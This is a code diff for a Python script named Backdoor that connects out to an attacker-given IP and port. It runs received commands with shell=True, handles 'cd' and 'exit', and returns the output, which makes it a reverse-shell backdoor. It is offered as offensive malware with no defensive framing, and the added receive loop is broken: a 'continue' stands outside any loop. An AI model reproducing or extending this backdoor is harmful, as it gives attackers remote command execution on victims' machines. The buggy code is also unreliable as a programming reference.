@@ -6,6 +6,7 @@ import subprocess
 import optparse
 import socket
 import json
+import os
 
 
 def get_arguments():
@@ -32,24 +33,38 @@ class Backdoor:
 
 
     def reliable_receive(self):
-        json_data = self.connection.recv(1024)
-        return json.loads(json_data)
+        json_data = ''
+        try:
+            json_data += self.connection.recv(1024)
+            return json.loads(json_data)
+        except ValueError:
+            continue
 
 
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
 
+    def change_working_directory(self, path):
+        os.chdir(path)
+        return('[+] Changing working directory to ' + path)
+
+
     def run(self):
         while True:
             command = self.reliable_receive()
-            command_result = self.execute_system_command(command)
-            self.reliable_send(command_result)
+            if command[0] == 'exit':
+                self.connection.close()
+                exit()
+            elif command[0] == 'cd' and len(command) > 1:
+                command_result = self.change_working_directory(command[1])
+            else:
+                command_result = self.execute_system_command(command)
 
-        connection.close()                      # closes connection
+            self.reliable_send(command_result)
 
 
 options = get_arguments()
 
 my_backdoor = Backdoor(options.ip, options.port)
-# connection.send('\n[+] Connection established.\n')              # verifies to attacker that connection is valid
+my_backdoor.run()
